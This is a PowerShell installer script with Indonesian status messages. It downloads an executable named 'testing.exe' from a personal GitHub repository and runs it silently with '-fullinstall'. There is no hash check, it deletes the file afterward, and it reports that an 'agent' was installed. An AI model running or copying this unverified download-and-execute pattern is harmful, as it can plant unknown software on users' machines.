$ErrorActionPreference = "Stop"

$DownloadUrl   = "https://raw.githubusercontent.com/centrin09123/testingrepo/eb3a372a5a3035fc7110a33d26be0610d995ed0f/testing.exe"
$InstallerPath = Join-Path $env:TEMP "ServiceInstaller.exe"
$InstallArgs   = "-fullinstall"

$ExpectedHash  = ""

Write-Host "============================================================" -ForegroundColor Cyan
Write-Host " Start Installing your desired app : $env:COMPUTERNAME" -ForegroundColor Cyan
Write-Host "============================================================" -ForegroundColor Cyan

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

try {
    Write-Host "[1/4] Mengunduh installer dari repository..."
    Invoke-WebRequest -Uri $DownloadUrl -OutFile $InstallerPath -UseBasicParsing

    $headerBytes = [System.IO.File]::ReadAllBytes($InstallerPath)[0..1]
    if ($headerBytes[0] -ne 0x4D -or $headerBytes[1] -ne 0x5A) {
        throw "File yang terunduh bukan executable Windows yang valid (kemungkinan URL mengembalikan HTML)."
    }

    Write-Host "[3/4] Menjalankan instalasi service ($InstallArgs)..."
    $process = Start-Process -FilePath $InstallerPath -ArgumentList $InstallArgs -Wait -PassThru -NoNewWindow

    if ($process.ExitCode -ne 0) {
        throw "Installer berhenti dengan Exit Code: $($process.ExitCode)"
    }

    Write-Host "[4/4] Membersihkan file installer sementara..."
    Remove-Item -Path $InstallerPath -Force -ErrorAction SilentlyContinue

    Write-Host "`n[SUKSES] Agent berhasil terpasang di $env:COMPUTERNAME." -ForegroundColor Green
}
catch {
    Write-Host "`n[GAGAL] Terjadi kesalahan: $_" -ForegroundColor Red
    if (Test-Path $InstallerPath) {
        Remove-Item -Path $InstallerPath -Force -ErrorAction SilentlyContinue
    }
    exit 1
}
